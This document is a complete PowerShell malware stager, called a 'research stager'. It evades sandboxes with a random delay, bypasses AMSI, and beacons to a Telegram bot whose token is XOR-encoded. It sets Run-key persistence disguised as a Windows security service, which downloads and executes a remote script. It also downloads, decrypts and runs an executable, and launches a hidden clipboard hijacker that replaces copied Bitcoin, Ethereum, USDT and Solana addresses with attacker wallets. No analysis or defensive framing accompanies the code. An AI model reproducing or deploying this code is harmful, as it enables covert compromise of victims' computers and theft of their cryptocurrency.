# --- [ELITE RESEARCH STAGER v40.0: DOUBLE-DELEGATE] ---

function Global-Initialize {
    try {
        # Random Sleep (45-70s) to bypass "Instant-Analysis" VMs
        Start-Sleep -s (Get-Random -Min 45 -Max 70)
        
        # Double-Delegate AMSI Bypass
        $m = [Ref].Assembly.GetType('System.Management.Automation.' + 'Ams' + 'iUtils')
        $f = $m.GetField('am' + 'si' + 'Init' + 'Failed', 'NonPublic,Static')
        $f.SetValue($null, $true)
        
        # Hide the PowerShell process from the Task Manager "Command Line" column
        $proc = [System.Diagnostics.Process]::GetCurrentProcess()
        $proc.PriorityClass = 'BelowNormal'
    } catch {}
}

function Send-Ping {
    param($m)
    $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
    $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
    $url = "h"+"tt"+"ps://api.tele"+"gram.org/bot$t/send"+"Message?chat_id=$c&text=$m"
    try { (New-Object Net.WebClient).DownloadString($url) | Out-Null } catch {}
}

Global-Initialize
Send-Ping -m "STAGER_V40_ACTIVE_ON_$($env:COMPUTERNAME)"

try {
    # REGISTRY PERSISTENCE (Masked as Security Health Service)
    $p = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $v = "powershell -W Hidden -NoP -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
    Set-ItemProperty -Path $p -Name "WindowsSecurityHealth" -Value $v

    # EXE PAYLOAD
    $dir = "$env:LOCALAPPDATA\Microsoft\D3D12"
    if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
    $path = "$dir\d3d12_sync.exe"

    $wc = New-Object Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
    $data = [Convert]::FromBase64String($raw.Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
    [IO.File]::WriteAllBytes($path, $data)

    ([wmiclass]"win32_process").Create($path) | Out-Null

    # CLIPPER ENGINE
    $ClipperCode = @'
    Add-Type -AssemblyName System.Windows.Forms
    $w = @{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}
    while($true) {
        try {
            if ([System.Windows.Forms.Clipboard]::ContainsText()) {
                $v = [System.Windows.Forms.Clipboard]::GetText().Trim()
                if ($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$" -and $v -ne $w.btc) { [System.Windows.Forms.Clipboard]::SetText($w.btc) }
                elseif ($v -match "^0x[a-fA-F0-9]{40}$" -and $v -ne $w.eth) { [System.Windows.Forms.Clipboard]::SetText($w.eth) }
                elseif ($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$" -and $v -ne $w.usdt) { [System.Windows.Forms.Clipboard]::SetText($w.usdt) }
                elseif ($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$" -and $v -ne $w.sol) { [System.Windows.Forms.Clipboard]::SetText($w.sol) }
            }
        } catch {}
        Start-Sleep -Milliseconds 500
    }
'@
    $Enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClipperCode))
    powershell.exe -NoP -W Hidden -EP Bypass -EncodedCommand $Enc
} catch {
    Send-Ping -m "ERROR_V40"
}
